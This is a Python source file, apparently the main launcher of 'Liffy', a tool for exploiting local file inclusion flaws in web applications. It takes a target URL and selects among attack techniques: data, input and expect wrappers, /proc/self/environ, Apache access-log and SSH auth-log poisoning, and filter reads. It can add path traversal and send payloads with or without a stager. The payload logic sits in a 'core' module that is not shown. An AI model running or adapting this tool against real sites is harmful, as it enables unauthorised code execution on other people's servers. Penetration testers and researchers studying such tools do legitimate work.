#!/usr/bin/python

__author__ = 'rotlogix'
__author__ = 'unicornFurnace'

import argparse
import sys
import requests
import urlparse
import time
import core
import datetime
from blessings import Terminal


def main():
    # Terminal Colors
    t = Terminal()

    def banner():
        print(t.cyan("""

    .____    .__  _____  _____
    |    |   |__|/ ____\/ ____\__.__.
    |    |   |  \   __\   __<   |  |
    |    |___|  ||  |   |  |  \___  |
    |_______ \__||__|   |__|  / ____| v1.2
        \/                \/

"""))

    def progressbar():

        bar_width = 70
        sys.stdout.write(t.cyan("[{0}]  ".format(datetime.datetime.now())) + " " * bar_width)
        sys.stdout.flush()
        sys.stdout.write("\b" * (bar_width + 1))

        for w in xrange(bar_width):
            time.sleep(0.01)
            sys.stdout.write(".")
            sys.stdout.flush()

        sys.stdout.write("\n")

    #---------------------------------------------------------------------------------------------------

    banner()

    if not len(sys.argv):
        print(t.red("[{0}] ".format(datetime.datetime.now())) + "Not Enough Arguments!")
        print(t.red("[{0}] ".format(datetime.datetime.now())) + "Example: ./liffy.py --url \
        http://target/files.php?file= --data\n")
        sys.exit(0)

    #---------------------------------------------------------------------------------------------------

    """ Command Line Arguments """

    parser = argparse.ArgumentParser()
    parser.add_argument("--url", help="target url")
    parser.add_argument("--data", help="data technique", action="store_true")
    parser.add_argument("--input", help="input technique", action="store_true")
    parser.add_argument("--expect", help="expect technique", action="store_true")
    parser.add_argument("--environ", help="/proc/self/environ technique", action="store_true")
    parser.add_argument("--access", help="access logs technique", action="store_true")
    parser.add_argument("--ssh", help="auth logs technique", action="store_true")
    parser.add_argument("--filter", help="filter technique", action="store_true")
    parser.add_argument("--location", help="path to target file (access log, auth log, etc.)")
    parser.add_argument("--nostager", help="execute payload directly, do not use stager", action="store_true")
    parser.add_argument("--relative", help="use path traversal sequences for attack", action="store_true")
    parser.add_argument("--cookies", help="session cookies")
    args = parser.parse_args()

    #---------------------------------------------------------------------------------------------------

    """ Assign argument values """

    url = args.url
    nostager = args.nostager
    relative = args.relative
    c = args.cookies

    #---------------------------------------------------------------------------------------------------

    """ Check to make sure target is actually up """

    print(t.cyan("[{0}] ".format(datetime.datetime.now())) + "Checking Target: {0}".format(url))
    parsed = urlparse.urlsplit(url)
    domain = parsed.scheme + "://" + parsed.netloc
    progressbar()

    try:
        r = requests.get(domain)
        if r.status_code != 200:
            print(t.red("[{0}] ".format(datetime.datetime.now())) + "Did Not Receive Correct Response From Target URL!")
        else:
            print(t.red("[{0}] ".format(datetime.datetime.now())) + "Target URL Looks Good!")
            if args.data:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + "Data Technique Selected!")
                d = core.Data(url, nostager, c)
                d.execute_data()
            elif args.input:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + "Input Technique Selected!")
                i = core.Input(url, nostager, c)
                i.execute_input()
            elif args.expect:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + "Expect Technique Selected!")
                e = core.Expect(url, nostager, c)
                e.execute_expect()
            elif args.environ:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + "/proc/self/environ Technique Selected!")
                i = core.Environ(url, nostager, relative, c)
                i.execute_environ()
            elif args.access:
                if not args.location:
                    print(t.red("[{0}] ".format(datetime.datetime.now())) + "Log Location Not Provided! Using Default")
                    l = '/var/log/apache2/access.log'
                else:
                    l = args.location
                a = core.Logs(url, l, nostager, relative, c)
                a.execute_logs()
            elif args.ssh:
                if not args.location:
                    print(t.red("[{0}] ".format(datetime.datetime.now())) + "Log Location Not Provided! Using Default")
                    l = '/var/log/auth.log'
                else:
                    l = args.location
                a = core.SSHLogs(url, l, relative, c)
                a.execute_ssh()
            elif args.filter:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + "Filter Technique Selected!")
                f = core.Filter(url, c)
                f.execute_filter()
            else:
                print(t.red("[{0}] ".format(datetime.datetime.now())) + "Technique Not Selected!")
                sys.exit(0)
    except requests.exceptions.RequestException as e:
        print(t.red("[{0}] HTTP Error!".format(datetime.datetime.now())) + str(e))

    #---------------------------------------------------------------------------------------------------


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        t = Terminal()
        print(t.red(" [{0}] ".format(datetime.datetime.now())) + "Keyboard Interrupt!")
        sys.exit(0)

